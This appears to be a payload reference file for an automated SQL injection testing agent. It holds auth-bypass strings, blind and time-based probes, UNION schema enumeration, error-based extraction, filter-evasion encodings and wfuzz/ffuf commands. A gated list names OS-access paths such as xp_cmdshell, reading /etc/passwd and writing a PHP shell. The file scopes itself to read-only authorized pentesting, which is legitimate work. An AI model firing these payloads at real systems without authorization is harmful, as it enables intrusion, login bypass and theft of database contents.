# payloads — sqli-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Compreensivo de Auditoria e Testes de SQL Injection.md` (Section 5: PAYLOADS / PROBES)

Probes are organized by goal. All examples use read-only test commands —
`sleep`, `version()`, and `UNION SELECT NULL`. Do NOT substitute
destructive DDL or `DROP`/`TRUNCATE` payloads without explicit
`destructive_testing: approved` in `security-scope.yaml`.

---

## Syntactic Probes (confirm input reaches SQL)

```
'                      # single quote — most common break
"                      # double quote — some backends
;                      # statement terminator
\'                     # escaped quote (test filter evasion)
' OR 'a'='a
" OR "a"="a
```

A 500-series error or a syntax message that names the backend
(`Unclosed quotation mark`, `ORA-00933`, `ERROR 1064 (MySQL syntax)`)
confirms the input reaches the SQL parser.

## Authentication Bypass

```
admin'--
admin' #
' OR 1=1--
' OR '1'='1
' OR '1'='1' --
') OR ('1'='1
admin')/*
```

The `--` or `#` terminates the remainder of the original query. The `')`
and `)/*` variants break out of parenthesized WHERE clauses.

## Boolean-Based Blind

Pair each probe with its inverse and compare response length / status:

```
' AND 1=1--
' AND 1=2--
' AND (SELECT 1)=1--
' AND (SELECT 1)=2--
' AND SUBSTRING(@@version,1,1)='5'--
```

## Time-Based Blind (backend-specific)

```
# MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND BENCHMARK(5000000, SHA1('test'))--

# PostgreSQL
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

# Oracle
' AND DBMS_LOCK.SLEEP(5)--
' AND 1=(CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)--

# SQLite
' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000))))--
```

Expected behaviour: the server response is delayed by approximately the
number of seconds supplied in the payload.

## UNION-Based Column Discovery

First find the column count via `ORDER BY`:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 10--        # last N that doesn't error
```

Then probe column positions with `NULL`:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Once the column count is known, fingerprint each position with a typed
value to find the one that renders:

```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

## Database Fingerprinting

```
# MySQL / MariaDB
' UNION SELECT @@version--
' AND @@version LIKE '5%'--
' AND @@version LIKE '10%'--    # MariaDB

# PostgreSQL
' UNION SELECT version()--
' AND current_database()='...'--

# MSSQL
' UNION SELECT @@version--
'; SELECT SERVERPROPERTY('productversion')--

# Oracle
' UNION SELECT banner FROM v$version--
' UNION SELECT * FROM v$instance--

# SQLite
' UNION SELECT sqlite_version()--
```

## Schema Enumeration (read-only)

```
# MySQL
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# PostgreSQL
' UNION SELECT tablename FROM pg_tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# MSSQL
' UNION SELECT name FROM sysobjects WHERE xtype='U'--
' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--
```

## Error-Based Extraction

### MySQL

```
' AND updatexml(1, concat(0x7e, (SELECT version())), 1)--
' AND extractvalue(1, concat(0x7e, (SELECT user())))--
```

### MSSQL

```
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=(SELECT @@version)--
```

### PostgreSQL

```
' AND 1=CAST((SELECT version()) AS int)--
```

These return the extracted value inside the error message.

## Evasion / Filter Bypass

```
# Inline comments (break naive keyword blacklists)
SEL/**/ECT
UN/**/ION/**/SEL/**/ECT

# Whitespace alternatives
SELECT%09version()           # tab
SELECT%0aversion()           # newline
SELECT/**/version()

# Case variation
SeLeCt VeRsIoN()

# Hex-encoded operands
UNION SELECT 0x726F6F74      # 'root' in hex

# URL encoding
%27%20OR%201%3D1--
%2527%2520OR%25201%253D1     # double encoded

# Null-byte / unicode
admin%00' OR '1'='1
admin'%20OR%201%3D1-- -
```

## Authentication-Context Payloads (JSON / headers)

```
# JSON body
{"username": "admin'-- -", "password": "x"}
{"username": {"$ne": null}, "password": {"$ne": null}}    # NoSQL note: escalate to NoSQL hunter

# Header reflection
X-Forwarded-For: 127.0.0.1' OR '1'='1
User-Agent: Mozilla' UNION SELECT NULL,NULL--
```

## Confirmed-Only Commands (do NOT run without approval)

These appear in the source as RCE/OS-access paths. They are listed for
awareness; do not submit without explicit `destructive_testing: approved`
in `security-scope.yaml`:

- `xp_cmdshell 'whoami'` (MSSQL — requires privileged DB user)
- `SELECT * FROM openrowset(...)` (MSSQL — file-system access)
- `COPY ... FROM PROGRAM '...'` (PostgreSQL — OS command)
- `SELECT load_file('/etc/passwd')` (MySQL — file read; `FILE` privilege)
- `INTO OUTFILE '/var/www/html/shell.php'` (MySQL — file write)

Detection of one of these paths is already a Critical finding; exploitation
is gated.

---

## Fuzzing Command Examples (read-only)

```
# wfuzz with a SQLi wordlist
wfuzz -c -w /usr/share/wordlists/sqli/Generic-SQLi.txt \
      -u "https://target/search?q=FUZZ" \
      --hc 404 --hl 42         # filter out 404s and 42-line baseline

# ffuf GET parameter fuzz
ffuf -w /usr/share/wordlists/sqli/Generic-SQLi.txt:F \
     -u "https://target/item?id=F" \
     -mc all -of json
```

Note: `sqlmap` is deliberately not in the tool allow-list for this skill
(see `validate-skills.sh` forbidden-tools check) — sqlmap is destructive
by default. Confirm-only with curl/ffuf, then escalate to `/security/pentest`
for Shannon-controlled exploitation.
